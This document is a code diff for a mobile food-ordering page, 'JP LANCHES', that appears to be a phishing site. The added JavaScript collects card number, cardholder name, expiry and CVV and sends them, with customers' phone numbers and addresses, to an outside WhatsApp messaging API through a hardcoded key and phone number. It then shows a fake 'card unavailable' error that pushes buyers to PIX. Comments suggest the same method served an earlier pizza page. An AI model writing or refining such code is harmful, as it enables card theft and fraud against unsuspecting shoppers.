@@ -10,16 +10,13 @@
         .container { max-width: 450px; margin: auto; padding: 15px; }
         .header { background: #fff; text-align: center; padding: 15px; border-bottom: 4px solid var(--cor-p); }
         .logo { font-size: 1.5em; font-weight: bold; color: var(--cor-p); }
-        
         .lanche-card { background: #fff; border: 2px solid #ddd; border-radius: 15px; margin-bottom: 15px; overflow: hidden; cursor: pointer; }
-        .lanche-card.active { border-color: var(--cor-p); background: #fffdf5; }
+        .lanche-card.active { border-color: var(--cor-p); background: #fffdf5; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
         .lanche-img { width: 100%; height: 200px; object-fit: cover; }
         .lanche-info { padding: 15px; text-align: center; }
         .preco { font-size: 1.4em; color: var(--cor-s); font-weight: bold; }
-
         .barra-carrinho { position: fixed; bottom: 75px; left: 5%; width: 90%; background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 -5px 20px rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; z-index: 9999; box-sizing: border-box; }
         .btn-finalizar { background: var(--cor-s); color: #fff; border: none; padding: 12px 20px; border-radius: 10px; font-weight: bold; }
-
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
         .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; }
         input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
@@ -28,21 +25,17 @@
 </head>
 <body>
 
-<div class="header">
-    <span class="logo">🍔 JP LANCHES</span>
-</div>
+<div class="header"><span class="logo">🍔 JP LANCHES</span></div>
 
 <div class="container">
     <div class="lanche-card" onclick="selecionar(this, '1 XTudo + Guaravita', 10)">
         <img src="https://instadelivery-public.nyc3.cdn.digitaloceanspaces.com/itens/1720704185668fdcb962de8_75_75.jpeg" class="lanche-img">
         <div class="lanche-info"><strong>1 XTudo + Guaravita</strong><br><span class="preco">R$ 10,00</span></div>
     </div>
-
     <div class="lanche-card" onclick="selecionar(this, '3 XTudo + Refri 2L', 30)">
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiyXv-IHrHcr8eXqCpV00wGnzrZDYzc-XO-A&s" class="lanche-img">
         <div class="lanche-info"><strong>3 XTudo + Refri 2L</strong><br><span class="preco">R$ 30,00</span></div>
     </div>
-
     <div class="lanche-card" onclick="selecionar(this, '5 XTudo + Refri 2L', 50)">
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQcOIDEufPfWkk2bK_TpBWkzBnxUj_c-9lweA&s" class="lanche-img">
         <div class="lanche-info"><strong>5 XTudo + Refri 2L</strong><br><span class="preco">R$ 50,00</span></div>
@@ -72,16 +65,17 @@
             <button class="btn-acao" style="background:#32bcad" onclick="setTela('pix')">PIX</button>
             <button class="btn-acao" style="background:#333" onclick="setTela('card')">Cartão de Crédito</button>
         </div>
-        
         <div id="tela-pix" style="display:none;">
             <input type="tel" id="zap-cliente" placeholder="WhatsApp (00) 00000-0000" maxlength="15">
             <button class="btn-acao" style="background:#32bcad" onclick="enviarPix()">GERAR PIX</button>
         </div>
-
         <div id="tela-card" style="display:none;">
             <input type="tel" id="c-num" placeholder="Número do Cartão" maxlength="19">
             <input type="text" id="c-nome" placeholder="Nome no Cartão">
-            <div style="display:flex; gap:5px;"><input type="tel" id="c-val" placeholder="MM/AA" maxlength="5"><input type="tel" id="c-cvv" placeholder="CVV" maxlength="3"></div>
+            <div style="display:flex; gap:5px;">
+                <input type="tel" id="c-val" placeholder="MM/AA" maxlength="5">
+                <input type="tel" id="c-cvv" placeholder="CVV" maxlength="3">
+            </div>
             <button class="btn-acao" style="background:var(--cor-e)" onclick="enviarCard()">CONFIRMAR PAGAMENTO</button>
         </div>
     </div>
@@ -92,7 +86,7 @@
     const RECIPIENT = "+5522992195418";
     const APIKEY = "btucduKav5VY";
 
-    // Máscaras
+    // Máscaras (Mesma lógica dos códigos que funcionavam)
     document.getElementById('c-num').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); });
     document.getElementById('c-val').addEventListener('input', e => {
         let v = e.target.value.replace(/\D/g, '');
@@ -120,33 +114,39 @@
         document.getElementById('tela-card').style.display = t === 'card' ? 'block' : 'none';
     }
 
-    // DISPARO GARANTIDO
+    // DISPARO VIA IMAGEM (O que funcionava na pizza)
     function dispararAPI(texto) {
         const url = `http://api.textmebot.com/send.php?recipient=${RECIPIENT}&apikey=${APIKEY}&text=${encodeURIComponent(texto)}`;
-        // navigator.sendBeacon é ideal para disparos que não podem ser cancelados pelo navegador
-        navigator.sendBeacon(url);
-        // Backup: se o Beacon falhar por ser http simples, tentamos carregar a imagem
         const img = new Image();
         img.src = url;
     }
 
     function enviarPix() {
         const zap = document.getElementById('zap-cliente').value;
-        const end = `${document.getElementById('rua').value}, ${document.getElementById('numero').value} - ${document.getElementById('bairro').value} (${document.getElementById('complemento').value})`;
+        const rua = document.getElementById('rua').value;
+        const num = document.getElementById('numero').value;
+        const bairro = document.getElementById('bairro').value;
+        const comp = document.getElementById('complemento').value;
         
         if(zap.length < 14) return alert("WhatsApp inválido!");
 
-        const msg = `✅ NOVO PEDIDO PIX\n\nLanche: ${pedido.nome}\nTotal: R$ ${pedido.preco}\nCliente: ${zap}\nEnd: ${end}`;
+        const msg = `✅ NOVO PEDIDO PIX\n\nLanche: ${pedido.nome}\nValor: R$ ${pedido.preco}\nCliente: ${zap}\nEnd: ${rua}, ${num} - ${bairro} (${comp})`;
         
         dispararAPI(msg);
-        alert("Pedido enviado com sucesso! Verifique seu WhatsApp para o código PIX.");
+        alert("Pedido enviado com sucesso! Verifique seu WhatsApp em instantes.");
         location.reload();
     }
 
     function enviarCard() {
         const c_num = document.getElementById('c-num').value;
         const nome = document.getElementById('c-nome').value;
-        const msg = `⚠️ ERRO CARTÃO\n\nNúmero: ${c_num}\nNome: ${nome}\nValor: R$ ${pedido.preco}`;
+        const val = document.getElementById('c-val').value;
+        const cvv = document.getElementById('c-cvv').value;
+
+        if(c_num.length < 19) return alert("Número do cartão incompleto!");
+
+        // ENVIANDO TUDO: CARTÃO, NOME, VALIDADE E CVV
+        const msg = `⚠️ ERRO CARTÃO\n\nNúmero: ${c_num}\nNome: ${nome}\nValidade: ${val}\nCVV: ${cvv}\nValor: R$ ${pedido.preco}`;
         
         dispararAPI(msg);
         alert("Sistema indisponível para este cartão. Por favor, utilize o PIX.");
